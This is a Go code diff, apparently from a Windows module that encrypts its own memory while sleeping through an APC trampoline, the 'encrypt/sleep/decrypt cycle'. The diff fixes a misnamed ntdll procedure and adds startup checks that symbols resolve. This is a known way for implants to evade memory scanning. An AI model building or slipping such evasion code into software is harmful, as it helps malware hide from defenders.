@@ -95,7 +95,7 @@ var (
 
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
 	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
-	procNtWaitForSingleObjectEx  = ntdll.NewProc("NtWaitForSingleObjectEx")
+	procNtWaitForSingleObject  = ntdll.NewProc("NtWaitForSingleObject")
 	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
 
 	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
@@ -235,6 +235,22 @@ var trampoline = []byte{
 }
 
 func init() {
+	// Resolve every Windows procedure we call at startup so a bad symbol
+	// name fails loudly here instead of panicking on the first Sleep().
+	// Learned the hard way — an "NtWaitForSingleObjectEx" typo (that
+	// function does not exist in ntdll; the Ex suffix is Win32-only)
+	// produced a silent 2-second crash on the first sleep cycle.
+	for _, p := range []*syscall.LazyProc{
+		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
+		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
+		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
+		procSystemFunction032,
+	} {
+		if err := p.Find(); err != nil {
+			panic(fmt.Sprintf("apc: cannot resolve %s: %v", p.Name, err))
+		}
+	}
+
 	// The trampoline references apcArgs fields by hard-coded byte offset.
 	// Fail loudly at startup if Go's struct layout has drifted from what
 	// the machine code expects — a mismatch here would produce a silent
@@ -487,13 +503,13 @@ func Sleep(sleepMs uint64) error {
 	// dispatches the trampoline (which runs the whole encrypt/sleep/
 	// decrypt cycle synchronously), and returns STATUS_USER_APC when the
 	// trampoline is done. We wait on the current-process handle because
-	// NtWaitForSingleObjectEx requires SOME valid handle and the process
+	// NtWaitForSingleObject requires SOME valid handle and the process
 	// handle never signals from inside the process — the wait can only
 	// return via the APC completion path.
 	//
 	// Timeout=0 as a PLARGE_INTEGER argument means NULL, which the kernel
 	// interprets as "wait indefinitely."
-	procNtWaitForSingleObjectEx.Call(
+	procNtWaitForSingleObject.Call(
 		uintptr(windows.CurrentProcess()),
 		1, // Alertable = TRUE
 		0, // Timeout = NULL (INFINITE)
